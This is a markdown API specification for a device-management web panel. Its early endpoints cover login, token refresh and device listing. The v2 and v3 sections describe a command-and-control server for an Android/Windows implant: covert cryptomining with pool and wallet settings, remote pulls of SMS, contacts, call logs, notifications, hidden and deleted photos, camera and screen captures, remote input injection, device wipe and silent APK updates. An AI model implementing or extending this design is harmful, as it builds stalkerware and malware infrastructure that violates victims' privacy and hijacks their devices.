# needs-panel.md

Every endpoint the web panel WILL call once a real backend exists. Until then MSW handlers in `/panel/mocks` implement all of them in-browser.

Legend: `silent refresh` = exactly one refresh-token exchange on 401, then retry the original call once.

## Endpoints

| # | Method | Path | Purpose | Auth |
|---|--------|------|---------|------|
| P1 | POST | /api/auth/login | Obtain access + refresh tokens | none |
| P2 | POST | /api/auth/refresh | Rotate tokens | refresh token body |
| P3 | GET | /api/devices?platform={android,windows} | List devices | Bearer access |
| P4 | GET | /api/devices/{id} | Device detail | Bearer access |
| P5 | POST | /api/devices/{id}/reconnect | Force reconnect | Bearer access |
| P6 | DELETE | /api/devices/{id} | Remove device | Bearer access |
| P7 | POST | /api/devices/{id}/commands | Queue command | Bearer access |

## P1 POST /api/auth/login

| Field | Type | Constraint |
|-------|------|------------|
| email | string | RFC 5322 subset |
| password | string | 8..128 chars |

| Response | Status | Notes |
|----------|--------|-------|
| {accessToken: jwt, refreshToken: uuid, user: {email, displayName}} | 200 | access in memory, refresh in localStorage |
| {message} | 401 | bad credentials -> inline error, no redirect |

| Property | Value |
|----------|-------|
| Retry policy | none (user resubmits) |
| Offline | disable submit, banner "تعذر الاتصال" |

## P2 POST /api/auth/refresh

| Field | Type | Constraint |
|-------|------|------------|
| refreshToken | string | stored uuid |

| Response | Status | Notes |
|----------|--------|-------|
| {accessToken, refreshToken} | 200 | rotation: new refresh replaces old |
| {message} | 401 | purge storage, redirect #/login |

| Property | Value |
|----------|-------|
| Retry policy | single shot, no retry |
| Offline | keep tokens, retry next 401 |

## P3 GET /api/devices?platform=

| Query | Type | Values |
|-------|------|--------|
| platform | string? | android, windows |

| Response | Status | Notes |
|----------|--------|-------|
| [{id, name, phone, model, platform, sdk, state, lastSeen}] | 200 | state in {online, offline, syncing, error}; phone E.164 |
| - | 401 | silent refresh then retry once; else redirect login |
| - | 429 | cooldown banner with countdown (Retry-After honored, default 30s) |
| - | 500 | server-error banner + retry button |
| network error | - | offline banner |

| Property | Value |
|----------|-------|
| Polling | every 5s while tab visible and route == devices |
| Offline | last good list stays; polling continues to try |

## P4 GET /api/devices/{id}

| Response | Status | Notes |
|----------|--------|-------|
| {id, name, phone, model, platform, sdk, state, lastSeen} | 200 | |
| - | 404 | device removed -> back to list |
| - | 401 / 429 / 500 | same as P3 |

## P5 POST /api/devices/{id}/reconnect

| Body | none |
|------|------|

| Response | Status | Notes |
|----------|--------|-------|
| {id, ..., state: "syncing"} | 200 | refresh detail view |
| - | 404 / 401 / 429 / 500 | same as P3 |

## P6 DELETE /api/devices/{id}

| Response | Status | Notes |
|----------|--------|-------|
| {ok: true, id} | 200 | navigate back to list |
| - | 404 / 401 / 429 / 500 | same as P3 |

## P7 POST /api/devices/{id}/commands

| Field | Type | Constraint |
|-------|------|------------|
| command | string | enum[ping, sync_config] |

| Response | Status | Notes |
|----------|--------|-------|
| {ok, id, command, queuedAt} | 200 | flash "تم إرسال الأمر" |
| {message} | 400 | unknown command |
| - | 401 / 429 / 500 | same as P3 |

## Current fake transport mapping

| Handler file | Covers |
|--------------|--------|
| /panel/mocks/handlers.js | P1..P7 in dev server and Playwright |
| /panel/mocks/fixtures/index.js | 3 devices, 1 operator account |

---

## v2 endpoints (implemented)

| # | Method | Path | Purpose | Auth |
|---|--------|------|---------|------|
| P8 | POST | /api/auth/2fa | Exchange pre2fa `ticket` + `code` for access/refresh tokens | none |
| P9 | GET | /api/devices/{id}/photos | Photo inventory + `{counts:{original,hidden,deleted}}` | Bearer access |
| P10 | POST | /api/devices/{id}/photos/report | Agent inventory upsert (device-only) | device credential |
| P11 | POST | /api/devices/{id}/files | Agent artifact upload (b64 + sha256) → drop dir, dedup by hash | device credential |
| P12 | GET | /api/devices/{id}/files | `{count, dir, files[]}` — artifact rows (id/kind/category/bytes/sha256/createdAt, ≤300) | Bearer access **or** device credential (own rows only) |
| P13 | GET | /api/devices/{id}/events | SSE stream — instant command push (`data: {cmd}`) | device credential |
| P14 | POST | /api/devices/{id}/commands/{cid}/result | Agent reports `executed|failed` + result | device credential |
| P15 | POST | /api/devices/{id}/heartbeat | 15 s heartbeat `{gender, stats, miner, screen}` | device credential |

## v3 endpoints (implemented)

|| # | Method | Path | Purpose | Auth |
||---|--------|------|---------|------|
|| P16 | GET | /api/devices/{id}/files/{fileId}/content | Stream one artifact (frame/file/dump) with sane mime | Bearer access, owner-scoped |
|| P17 | POST | /api/devices/enroll-token | Mint single-use enroll JWT (30 min), bound to issuing user | Bearer access |
|| P18 | POST | /api/devices/{id}/enroll-token | Re-issue enroll JWT for an existing device | Bearer access, owner-scoped |
|| P19 | POST | /api/devices/{id}/mining/start | `{algo,pool,wallet,threads}` → queues `mine_start`, arms STARTING | Bearer access, owner-scoped |
|| P20 | POST | /api/devices/{id}/mining/stop | Queues `mine_stop` | Bearer access, owner-scoped |
|| P21 | GET | /api/devices/{id}/mining | `{minerState, hashrate[], sessions[]}` | Bearer access, owner-scoped |
|| P22 | POST | /api/devices/{id}/phone/reveal | Returns decrypted phone, writes audit | Bearer access, owner-scoped |

Notes:
- `GET /devices/{id}/commands` accepts **both** auth kinds: user (owner) and device credential.
- Command vocabulary: `ping, wipe, camera, pull_photos, screen_capture, sms, contacts, call_log, mine_start, mine_stop, input_tap, input_swipe, input_text, files_pull, notifications_pull, apk_update`.
- `input_*` payloads: tap `{x,y}`, swipe `{x1,y1,x2,y2,ms}`, text `{text}` — coordinates normalized 0..1.
- `files_pull` payload `{category: documents|downloads|audio|video, limit≤50}`; uploads land as `kind=file category=<cat>`.
- `notifications_pull` dumps the on-device 500-entry ring → `kind=dump category=notifications` JSON `[{pkg,title,text,atMs}]`.
- `wipe` → `executed` flips `Device.formattedAt` + `status=formatted` (dashboard "محذوف").
- File drop: `PANEL_DROP_DIR/{deviceId}/{category}/{ts}_{name}`, SHA-256 dedup via `DownloadedFile`.
